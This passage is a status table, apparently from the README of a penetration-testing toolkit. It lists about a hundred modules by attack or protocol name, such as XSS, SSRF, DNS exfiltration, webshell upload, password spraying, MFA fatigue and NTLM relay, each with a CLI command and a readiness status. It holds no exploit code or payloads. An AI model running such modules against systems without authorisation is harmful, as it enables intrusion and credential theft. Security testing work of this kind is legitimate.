| 16 | XSS Reflected | `xss reflect` | ✅ READY |
| 17 | CRLF Injection | `crlf header` | ✅ READY |
| 18 | Cookie Tamper | `cookie tamper` | ✅ READY |
| 19 | Clickjacking | `click frame` | ✅ READY |
| 20 | CSRF Token | `csrf token` | ✅ READY |
| 21 | IDOR | `idor test` | ✅ READY |
| 22 | Session Fixation | `session fixation` | ✅ READY |
| 23 | HPP | `hpp detect` | ✅ READY |
| 24 | GraphQL | `graphql-attack introspect` | ✅ READY |
| 25 | Actuator | `actuator env` | ✅ READY |
| 26 | CSP Inline | `csp inline` | ✅ READY |
| 27 | RCE | `rce detect` | ✅ READY |
| 28 | Deserialization | `deser detect` | ✅ READY |
| 29 | postMessage | `postmsg origin` | ✅ READY |
| 30 | Service Worker | `sw register` | ✅ READY |
| 31 | Unicode Homoglyph | `unicode homoglyph` | ✅ READY |
| 32 | Unicode BIDI | `unicode bidi` | ✅ READY |
| 33 | Wfuzz Param | `wfuzz param` | ✅ READY |
| 34 | WAF Detect | `waf detect` | ✅ READY |
| 35 | Exploit Lookup | `exploit lookup` | ✅ READY |
| 36 | Exploit Search | `exploit search` | ✅ READY |
| 37 | XXE | `xxe file` | ✅ READY |
| 38 | SSRF | `ssrf probe` | ✅ READY |
| 39 | TLS Scanner | `tls scan` | ❌ FIXED (needs retest) |
| 40 | Command Injection | `cmdi detect` | ⏳ UNTESTED |
| 41 | LFI | `lfi read` | ⏳ UNTESTED |
| 42 | NoSQL Injection | `nosqli mongo` | ⏳ UNTESTED |
| 43 | SSTI | `ssti detect` | ⏳ UNTESTED |
| 44 | HTTP Smuggling | `smuggle detect` | ⏳ UNTESTED |
| 45 | Padding Oracle | `padoracle detect` | ⏳ UNTESTED |
| 46 | SSRF Chain | `ssrf chain` | ⏳ UNTESTED |
| 47 | Race Condition | `race race` | ⏳ UNTESTED |
| 48 | DNS Rebinding | `rebind attack` | ⏳ UNTESTED |
| 49 | ACL Check | `acl check` | ⏳ UNTESTED |
| 50 | Payload Generator | `payload gen` | ⏳ UNTESTED |
| 51 | API Enumeration | `api enum` | ⏳ UNTESTED |
| 52 | JWT Analysis | `jwt check/crack/forge` | ⏳ UNTESTED |
| 53 | OAuth Redirect | `oauth redirect` | ⏳ UNTESTED |
| 54 | MFA Fatigue | `mfa fatigue` | ⏳ UNTESTED |
| 55 | SAML XSW | `saml xsw` | ⏳ UNTESTED |
| 56 | WebAuthn Origin | `webauthn origin` | ⏳ UNTESTED |
| 57 | Kerberoasting | `kerb roast` | ⏳ UNTESTED |
| 58 | NTLM Relay | `ntlm relay` | ⏳ UNTESTED |
| 59 | Kubernetes | `k8s pods` | ⏳ UNTESTED |
| 60 | Cloud S3 | `cloud s3` | ⏳ UNTESTED |
| 61 | Docker API | `container docker` | ⏳ UNTESTED |
| 62 | CI/CD Injection | `cicd inject` | ⏳ UNTESTED |
| 63 | Supply Chain | `supply typosquat` | ⏳ UNTESTED |
| 64 | Webshell Upload | `shell upload` | ⏳ UNTESTED |
| 65 | Rate Limit Bypass | `ratelimit check` | ⏳ UNTESTED |
| 66 | Mass Scanner | `mass scan` | ⏳ UNTESTED |
| 67 | DNS Exfiltration | `exfil dns` | ⏳ UNTESTED |
| 68 | HTTP Brute Force | `brute http` | ⏳ UNTESTED |
| 69 | Cache Poisoning | `cache poison` | ⏳ UNTESTED |
| 70 | Password Spraying | `spray password` | ⏳ UNTESTED |
| 71 | Protocol Fingerprint | `proto enum` | ⏳ UNTESTED |
| 72 | gRPC | `grpc enum` | ⏳ UNTESTED |
| 73 | HTTP/2 | `h2 detect` | ⏳ UNTESTED |
| 74 | WebSocket | `ws connect` | ⏳ UNTESTED |
| 75 | WebDAV | `webdav enum` | ⏳ UNTESTED |
| 76 | SSE Injection | `sse inject` | ⏳ UNTESTED |
| 77 | WebAssembly | `wasm analyze` | ⏳ UNTESTED |
| 78 | WebRTC | `webrtc enum` | ⏳ UNTESTED |
| 79 | WSDL/SOAP | `wsdl enum` | ⏳ UNTESTED |
| 80 | BLE | `ble scan` | ⏳ UNTESTED |
| 81 | MQTT | `mqtt connect` | ⏳ UNTESTED |
| 82 | CoAP | `coap enum` | ⏳ UNTESTED |
| 83 | NTP | `ntp mon` | ⏳ UNTESTED |
| 84 | OT/SCADA | `ot enum` | ⏳ UNTESTED |
| 85 | AMQP | `amqp enum` | ⏳ UNTESTED |
| 86 | IPMI | `ipmi enum` | ⏳ UNTESTED |
| 87 | RDP | `rdp enum` | ⏳ UNTESTED |
| 88 | SMB | `smb enum` | ⏳ UNTESTED |
| 89 | SMTP | `smtp enum` | ⏳ UNTESTED |
| 90 | SNMP | `snmp enum` | ⏳ UNTESTED |
| 91 | SSH | `ssh enum` | ⏳ UNTESTED |
| 92 | Redis | `redisx enum` | ⏳ UNTESTED |
| 93 | Elasticsearch | `elastic enum` | ⏳ UNTESTED |
| 94 | FTP | `ftp anon` | ⏳ UNTESTED |
| 95 | Memcached | `memcache enum` | ⏳ UNTESTED |
| 96 | MongoDB | `mongo enum` | ⏳ UNTESTED |
| 97 | VNC | `vnc connect` | ⏳ UNTESTED |
| 98 | Telnet | `telnet connect` | ⏳ UNTESTED |
| 99 | SIP/VoIP | `sip enum` | ⏳ UNTESTED |
| 100 | RTSP | `rtsp enum` | ⏳ UNTESTED |
| 101 | NFS | `nfs enum` | ⏳ UNTESTED |
| 102 | X11 | `x11 connect` | ⏳ UNTESTED |
| 103 | STOMP | `stomp enum` | ⏳ UNTESTED |
| 104 | TFTP | `tftp read` | ⏳ UNTESTED |
| 105 | Finger | `finger enum` | ⏳ UNTESTED |
| 106 | ZooKeeper | `zookeeper enum` | ⏳ UNTESTED |
| 107 | etcd | `etcd enum` | ⏳ UNTESTED |
| 108 | UPnP | `upnp enum` | ⏳ UNTESTED |
| 109 | LDAP | `ldapi enum` | ⏳ UNTESTED |
| 110 | WinRM | `winrm enum` | ⏳ UNTESTED |
| 111 | Exchange | `exchange enum` | ⏳ UNTESTED |
| 112 | OWA | `owa enum` | ⏳ UNTESTED |
| 113 | SharePoint | `sharepoint enum` | ⏳ UNTESTED |
| 114 | IOC Checker | `ioc check` | ⏳ UNTESTED |
| 115 | Agent Mode | `agent run` | ⏳ UNTESTED |
| 116 | LLM Analysis | `llm analyze` | ⏳ UNTESTED |
| 117 | JNDI Injection | `jndi inject` | ⏳ UNTESTED |
| 118 | Web3 Audit | `web3 audit` | ⏳ UNTESTED |
| 119 | Git Exposure | `git enum` | ⏳ UNTESTED |
| 120 | Subdomain Takeover | `takeover scan` | ⏳ UNTESTED |
